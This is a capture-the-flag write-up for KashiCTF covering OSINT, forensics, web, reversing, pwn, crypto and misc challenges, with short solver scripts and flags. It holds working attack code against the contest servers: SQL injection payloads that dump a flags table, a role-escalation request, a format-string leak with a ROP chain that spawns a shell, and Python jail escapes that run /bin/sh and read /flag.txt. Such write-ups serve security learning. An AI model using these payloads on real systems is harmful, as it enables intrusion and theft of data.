# KashiCTF
![image](https://github.com/user-attachments/assets/898f2074-6f7e-430e-a657-77bb7821e4e9)
## 📜 List CTF Challenge

| Category   | Name Challege          | Point |
|-----------|---------------------------|--------|
| **OSINT**  | Old Diner                 | 411    |
| **OSINT**  | Kings                     | 458    |
| **OSINT**  | Who am I ??               | 100    |
| **Forensics**  | Stego Gambit           | 480    |
| **Forensics**  | Restaurant             | 152    |
| **Forensics**  | Do Not Redeem #2      | 434    |
| **Forensics**  | Do Not Redeem #1      | 319    |
| **Forensics**  | Memories Bring Back You | 100  |
| **Forensics**  | Corruption            | 100    |
| **Forensics**  | Look at Me             | 304    |
| **Web**  | SuperFastAPI               | 100    |
| **Web**  | Corporate Life 2           | 261    |
| **Web**  | Corporate Life 1           | 137    |
| **Reverse**  | Game 3 - CatSeabank | 479 |
| **Reverse**  | Game 1 - Untitled Game | 100 |
| **Pwn**  | The Troll Zone             | 452    |
| **Pwn**  | leap_of_faith              | 463    |
| **Crypto**  | Key Exchange        | 384    |
| **Crypto**  | Lost Frequencies    | 100    |
| **Misc**  | FinalGame?                | 432    |
| **Misc**  | Broken?                    | 490    |
| **Misc**  | SNOWy Evening              | 205    |
| **Misc**  | Game 2 - Wait              | 195    |
| **Misc**  | Easy Jail 2                | 100    |
| **Misc**  | Easy Jail                  | 100    |

# OSINT

### Old dinner
The popular diner in the USA that serves Coke floats is Lexington Candy Shop, which is popular on social media. At first, our team used brute force to determine the amount of money they paid with a gap of 0.05, and luckily, we got the flag.Then I did some research on the problem when the author said that we needed to find some bills I found a review on TripAdvisor 
![image](https://hackmd.io/_uploads/By5oS-oq1e.png)
And you can see the word "Very American experience" is a hint of the challs so it's clear enough that the the answer will be in the bill's picture

![image](https://hackmd.io/_uploads/B1s1Ibj5ke.png)
**Flag: KashiCTF{Lexington_Candy_Shop_41.65}**
### Kings
At first i found that's the Tutankhamun's meteoric iron dagger and that's kinda not related. Then i think about popular the extinct bird that's dodo bird. I actually found 2 artist that draw dodo bird that's Ustad Mansur and Roelant Savery(already try but failed)
But it's actually more match with Ustad Mansur information when he was in the Mughal Empire, which has a nice dagger(nice). Then the research take me to the wikiart site which actually his dodo painting(https://www.wikiart.org/en/ustad-mansur/untitled-dodo-1625) and that's currently located in Hermitage Museum, Saint Petersburg, Russia.


# Forensics
### Memories Bring Back You
Using FTK imager to open the file and found some images, and audio files.
Based on the challenge hint: "Every image tells a story, but some stories are meant to stay hidden." I found the flag inside image_421.jpg
![image](https://hackmd.io/_uploads/rk6g8-o5Jl.png)
**Flag :  KashiCTF{DF1R_g03555_Brrrr}**
### Corruption
The file given is a corrupted file so i use HxD to read it
Use search tool you can find the real flag is the second one
![image](https://hackmd.io/_uploads/Hy9bIbjckg.png)
![image](https://hackmd.io/_uploads/SJVf8Wj5yx.png)
**Flag: KashiCTF{FSCK_mE_B1T_by_b1t_Byt3_by_byT3}**
### Restaurant
There's some hint in the challenge that's "Maybe in the end they may give me something real. (Wrap the text in KashiCTF{})"
So i opened the image and found there's something in the end
![image](https://hackmd.io/_uploads/S10GLWs9Jl.png)
When i search on the internet for the image that's a bacon tomato pasta(really???), which related to Bacon cipher with sussy ABABABAB in the footer
After decrypting the text and we got this
![image](https://hackmd.io/_uploads/r1nQLWscJx.png)
**Flag: KashiCTF{THEYWEREREALLLLYCOOKING}**
### Look at Me
This problem use SilentEye tool to solve.
![image](https://hackmd.io/_uploads/Sk3E8Wscyx.png)
**Flag: KashiCTF{K33p_1t_re4l}**
### Do Not Redeem #1
The sms database will be in the file ```/data/data/com.android.providers.telephony/databases/mmssms.db```
Open mmssms.db file with DB browser and we got this 
![image](https://hackmd.io/_uploads/HkurUZj5yl.png)
Then browse the sms data in sms table and find for OTP sms
![image](https://hackmd.io/_uploads/SJUI8-s5yx.png)
**Flag: KashiCTF{839216_1740251608654}**
### Do Not Redeem #2
In the first problem, we can see the timestamp of the OTP sms is 1740251608654
![image](https://hackmd.io/_uploads/SkYPU-o9Jg.png)
So it gonna be 02:13(in my time display) and we can find there's only 5 package updated after that sussy OTP
![image](https://hackmd.io/_uploads/r14_8Wo5ke.png)
Then i give it a try to take a closer look on calendar(41kb really????) and that package got changed before the Amazon package so that's getting more sussy
So i submited the flag and it's correct.
**Flag: KashiCTF{com.google.calendar.android}**
### Stego Gambit
This problem actually easy but it wasted me alot of time
So here's the given image from the chall
![image](https://hackmd.io/_uploads/SJlq8bs5yx.png)
So first i import the picture into HxD and found something in the header 
![image](https://hackmd.io/_uploads/r1jiL-oqkx.png)
```Use the moves as a key to the flag, separated by _```
To find the moves, we just need to make the similar board on lichess and just leave the bot playing it(actually if white move first that's impossible because it's already check)
![image](https://hackmd.io/_uploads/HyU3U-o5Jx.png)
So 2 moves gonna be ```1. Bh1 Kxa2 2. Qg2#```
**Key: Bh1Kxa2_Qg2#**(i keep spamming Bh1_Kxa2_Qg2# freak)
With that pro key moment we gonna use steghide to extract something in image
![image](https://hackmd.io/_uploads/SyW68bocJg.png)
**Flag: KashiCTF{573g0_g4m617_4cc3p73d}**
# Web
### SuperFastApi
```python=
import requests

url = "http://kashictf.iitbhucybersec.in:10628"
data = {
  "fname": "3HLD",
  "lname": "string",
  "email": "string",
  "gender": "string",
  "role": "admin"
}
res = requests.post(url+'/create/3HLD',json=data)
print(res.text)
res = requests.put(url+'/update/3HLD',json=data)
res = requests.get(url+'/flag/3HLD')
print(res.text)
# {"message":"KashiCTF{m455_4551gnm3n7_ftw_F1t1dzlov}"}
```
**Flag :  KashiCTF{m455_4551gnm3n7_ftw_F1t1dzlov}**
### Corporate Life 1
```python=
import requests

url = "http://kashictf.iitbhucybersec.in:38209/api/list-v2"

data = {
    'filter' :   "'OR 1=1--"
}
res = requests.post(url,json=data)
a = res.json()
for i in a : 
    if(i.get('status') == 'denied'):
        print(i)
```
**FLAG : KashiCTF{s4m3_old_c0rp0_l1f3_vro3nUAH}**
### Corporate Life 2 : 
```python=
import requests

url = "http://kashictf.iitbhucybersec.in:46641/api/list-v2"

data = {
#    'filter' :   "aabc'UNION SELECT 1,1,1,1,1,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%')-- " => FInd flags tables 
#    'filter' :   "aabc'UNION SELECT 1,1,1,1,1,(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flags')-- "  => Find columns of flags tables 
    'filter' :   "aabc'UNION SELECT 1,1,1,1,1,(SELECT group_concat(secret_flag) from flags) --"  
}
res = requests.post(url,json=data)
print(res.json()[0].get('email').replace(',',''))
```
**Flag : KashiCTF{b0r1ng_old_c0rp0_l1f3_am_1_r1gh7_PbZ8N4Zi}**
# Reverse	

## Game 1 - Untitled Game

This challange is about godot game

![image](https://hackmd.io/_uploads/ryMRLZo9yl.png)

![image](https://hackmd.io/_uploads/HJCC8Zsckx.png)

Extract this Challange.exe file by GDRETools i have:

![image](https://hackmd.io/_uploads/HyIyDbjqyx.png)

In player.gd:

```
extends CharacterBody3D

const SPEED = 10.0
const JUMP_VELOCITY = 10.0

@onready var cam = $Camera3D
@onready var footstep = $footsteps
var flag = "KashiCTF{N07_1N_7H3_G4M3}"  # Get the footstep audio

var gravity = 20.0

func _ready():
	print(flag)
	Input.mouse_mode = Input.MOUSE_MODE_CAPTURED

func _unhandled_input(event):
	if event is InputEventMouseMotion:
		rotate_y(-event.relative.x * 0.005)
		cam.rotate_x(-event.relative.y * 0.005)
		cam.rotation.x = clamp(cam.rotation.x , -PI/2,PI/2)

func _physics_process(delta):
	# Add gravity.
	if not is_on_floor():
		velocity.y -= gravity * delta

	# Handle jump.
	if Input.is_action_just_pressed("ui_accept") and is_on_floor():
		velocity.y = JUMP_VELOCITY

	# Get movement direction.
	var input_dir = Input.get_vector("left", "right", "up", "down")
	var direction = (transform.basis * Vector3(input_dir.x, 0, input_dir.y)).normalized()
	
	if direction:
		velocity.x = direction.x * SPEED
		velocity.z = direction.z * SPEED
		
		# Play footstep sound only if it's not already playing
		if !footstep.playing:
			footstep.play()
	else:
		velocity.x = move_toward(velocity.x, 0, SPEED)
		velocity.z = move_toward(velocity.z, 0, SPEED)
		
		# Stop footstep sound when not moving
		$footsteps.stop()

	move_and_slide()

```
So I try to submit this flag and ez win :v: 
Another way it can also be solved by just find keyword "KashiCTF" in the cmd line:
![image](https://hackmd.io/_uploads/r1flPZjqke.png)


**Flag: KashiCTF{N07_1N_7H3_G4M3}**


## Game 3 - CatSeabank

In this challenge we **just** play game.
![image](https://hackmd.io/_uploads/rys3Pbj5Jx.png)
Use this bug to have a lot of money 

![image](https://hackmd.io/_uploads/SyYpPZi5kg.png)
Then pay him 2000 and then you can hear a sound like
```
The echoes of truth lie not in the open, but within the very fabric of this world.
The architects have found their secrets inside the vessel's core, hidden among its many forms.
Dig through the buried artifacts, extract what is unseen, and seek the whispers trapped in waves.
Only by unearthing the lost fragments, those.
```

Then i use tool Assetripper and open folder **CTF_Data** 
![image](https://hackmd.io/_uploads/ryqW_-s51g.png)

Then i see a very sus audio 
![image](http![image](https://hackmd.io/_uploads/B1Fz_Wiqyl.png)
s://hackmd.io/_uploads/Sy7VUg951g.png)

Download it then open it in audacity
![image](https://hackmd.io/_uploads/rJU7ubj9yg.png)
**KashiCTF{1t_Wa5_Ju5t_4_Tutori4l_RIP}**
# Pwn	

## leap_of_faith

![image](https://hackmd.io/_uploads/rkLqDbsqyl.png)

![image](https://hackmd.io/_uploads/rykjvWoqke.png)
What if we jump to main+1 many time ? Is rsp will be subtracted ?. I realized that we can control **rsp**.
Following this flow, I just brute force with luck and it was right 
```python3 
from pwn import * 

# p = process(b'./chall')
p = remote(b'kashictf.iitbhucybersec.in', 15806)

# gdb.attach(p)
# input()
for i in range (3):
    p.sendlineafter(b' : ', b'0x40125e')

# input()

p.sendlineafter(b': ', b'0x4011ba')

p.interactive()
```

## The Troll Zone

Checksec of the challenge

![image](https://hackmd.io/_uploads/BkVKw-j5kg.png)


After brute force dump value from the stack then i found the 17th value from the stack is the address of any function in libc
![image](https://hackmd.io/_uploads/HJk5BF_q1g.png)
So we can leak libc -> rop chain and call system("/bin/sh")

![image](https://hackmd.io/_uploads/S1RRBtdc1l.png)
offset to libc_base

![image](https://hackmd.io/_uploads/HyYVitdq1x.png)
/bin/sh = libc_base + 0x196031

![image](https://hackmd.io/_uploads/Byos8tuc1l.png)
pop_rdi = libc_base + 0x00000000000277e5

![image](https://hackmd.io/_uploads/r1kHPKuqye.png)
system = lib_base + 0x04c490

Script:
```python 
from pwn import *

elf = context.binary = ELF('./vuln_patched')
libc = elf.libc
# p = process()
p = remote(b'kashictf.iitbhucybersec.in', 47027)
# gdb.attach(p)

payload = b'hehe %17$p'
# input()
p.sendline(payload)
p.recvuntil(b'hehe ')
x = int(p.recvline().decode().strip(),16)
lib_base = x - 0x2724a
bin_sh = lib_base + 0x196031
pop_rdi = lib_base + 0x00000000000277e5
system = lib_base + 0x04c490
ret = 0x0000000000401016

payload = flat(
    b'A' * (0x20),
    p64(0x404000),
    p64(pop_rdi),
    p64(bin_sh),
    p64(ret),
    p64(system)
)

input()
p.sendline(payload)

p.interactive()
```
![image](https://hackmd.io/_uploads/HJYI6Yu9kg.png)
**Flag: KashiCTF{did_some_trolling_right_there_LMOruSfe}**

# Crypto	
## Lost Frequencies 
Parse morse code with 0 = '.' , 1= '_'
**Flag : KashiCTF{OHNOBINARYMORSE}**

## Key Exchange
Source code:
```python=
from redacted import EllipticCurve, FLAG, EXIT
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import hashlib
import random
import json
import os

def encrypt_flag(shared_secret: int):
    sha1 = hashlib.sha1()
    sha1.update(str(shared_secret).encode("ascii"))
    key = sha1.digest()[:16]
    iv = os.urandom(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(FLAG, 16))
    data = {}
    data["iv"] = iv.hex()
    data["ciphertext"] = ciphertext.hex()
    return json.dumps(data)

#Curve Parameters (NIST P-384)
p = 39402006196394479212279040100143613805079739270465446667948293404245721771496870329047266088258938001861606973112319
a = -3
b = 27580193559959705877849011840389048093056905856361568521428707301988689241309860865136260764883745107765439761230575
E = EllipticCurve(p,a,b)
G = E.point(26247035095799689268623156744566981891852923491109213387815615900925518854738050089022388053975719786650872476732087,8325710961489029985546751289520108179287853048861315594709205902480503199884419224438643760392947333078086511627871)

n_A = random.randint(2, p-1)
P_A = n_A * G

print(f"\nReceived from Weierstrass:")
print(f"   Here are the curve parameters (NIST P-384)")
print(f"   {p = }")
print(f"   {a = }")
print(f"   {b = }")
print(f"   And my Public Key: {P_A}")

print(f"\nSend to Weierstrass:")
P_B_x = int(input("   Public Key x-coord: "))
P_B_y = int(input("   Public Key y-coord: "))

try:
    P_B = E.point(P_B_x, P_B_y)
except:
    EXIT()

S = n_A * P_B

print(f"\nReceived from Weierstrass:")
print(f"   Message: {encrypt_flag(S.x)}")
```

So basically $G$ is the generator of the elliptic curve $E(p,a,b)$. So if we send $P_B=G$ to the server we can easily calculate the shared secret $S=n_A \times P_B = P_A$. The $x$ coordinate of $S$ is our shared secret and act as a key for our AES decryption.

Step 1: Send requests:

![image](https://hackmd.io/_uploads/Bkt-D-jckg.png)


Step 2: Decrypt:

```python=
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import unpad
import hashlib
from sage.all import *

P_A_x = 31727164154269526211264758782134271001659402316402855781026578866416551116056524321037075089020322198741216773782304
iv = bytes.fromhex("8ecefaf7ed9f93cdf3403bde4dc717e5")
ciphertext = bytes.fromhex("1c9002713efc67d2e57a7c4ca4fb1d80e040b317c2244aaf3b544c3df2de0b50bd9a1ce1dfdca6982b3797e32bafbe19f1e91181135c8f0397812979076dc50370658138dd8b88039a0d3b0ed5740e45e1ee19c5ab0ad326462eb4ec0c33866b")
sha1 = hashlib.sha1()
sha1.update(str(P_A_x).encode("ascii"))
key = sha1.digest()[:16]
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(ciphertext)
try:
    flag = unpad(plaintext, 16).decode()
    print(flag)
except Exception as e:
    print("failed", e)

```

Output: 
```
NaeusGRX{L_r3H3Nv3h_kq_Sun1Vm_O3w_4fg_4lx_1_t0d_a4q_lk1s_X0hcc_Dd4J_021P8svv}

Hint: DamnKeys
```
This is Vigenere Cipher with key = DamnKeys


![image](https://hackmd.io/_uploads/S1Fzv-iqJl.png)
```Flag: KashiCTF{I_r3V3Al3d_my_Pub1Ic_K3y_4nd_4ll_1_g0t_w4s_th1s_L0usy_Fl4G_021P8gil}```
# Misc

## FinalGame?

![image](https://hackmd.io/_uploads/H1XLuWsq1l.png)
**Flag: KashiCTF{Will_This_Be_My_Last_Game_e94fab41}**

## Game 2 - Wait
![image](https://hackmd.io/_uploads/B1kP_bo9Jx.png)

Run **wait.exe**. We need to spend time waiting for the flag. But i tried to change the time in my laptop to 2026 and I got flag.
![image](https://hackmd.io/_uploads/Bkguu-sqyx.png)

**Flag: KashiCTF{Ch4kr4_Vyuh}** 

## SNOWy Evening

```
➜  chall cat poemm.txt
Pity, in place of love,
That pettiest of gifts,
Is but a sugar-coating over neglect.
Any passerby can make a gift of it
To a street beggar,
Only to forget the moment the first corner is turned.
I had not hoped for anything more that day.

You left during the last watch of night.
I had hoped you would say goodbye,
Just say ‘Adieu’ before going away,
What you had said another day,
What I shall never hear again.
In their place, just that one word,
Bound by the thin fabric of a little compassion
Would even that have been too much for you to bear?

When I first awoke from sleep
My heart fluttered with fear
Lest the time had been over.
I rushed out of bed.
The distant church clock chimed half past twelve
I sat waiting near the door of my room
Resting my head against it,
Facing the porch through which you would come out.
```
The poem that author give to player.
As the name of the challenge we use **stegsnow** tool.
![image](https://hackmd.io/_uploads/HkCK_Zi51e.png)
![image](https://hackmd.io/_uploads/ByW9dZjqke.png)
The password is his friend's name: Aakash
Then we get: https://pastebin.com/HVQfa14Z
This is cow descript
![image](https://hackmd.io/_uploads/S1Uj_bscJl.png)
**Flag: KashiCTF{Love_Hurts_5734b5f}**

## Broken ?
```python=
import hashlib

SECRET_KEY = b'REDACTED'
#@ 01be4a249bed4886b93d380daba91eb4a0b1ee29
targetKey =  "01be4a249bed4886b93d380daba91eb4a0b1ee29"
def generate_hmac(message,secret):
    return hashlib.sha1(str(secret).encode() + message.encode()).hexdigest()
index=0
message = "count=10&lat=37.351&user_id=1&long=-119.827&file=flag.txt"
# brute force through word lists jwt.secret.keys 
print(generate_hmac(message,'super_secret_key'))
```
**Flag: KashiCTF{Close_Yet_Far_evhBM0QEu}**
## Easy Jail
```bash=
__import__('os').system('/bin/sh')
cat /flag.txt 
```
**Flag: KashiCTF{3V4L_41NT_54F3_jfLs92mb}**
## Easy Jail 2 
```bash
BLACKLIST.clear()
__import__('os').system('/bin/sh')
cat /flag.txt
```
**Flag: KashiCTF{C4N_S71LL_CL3AR_8L4CKL15T_0EnNdgEz}**
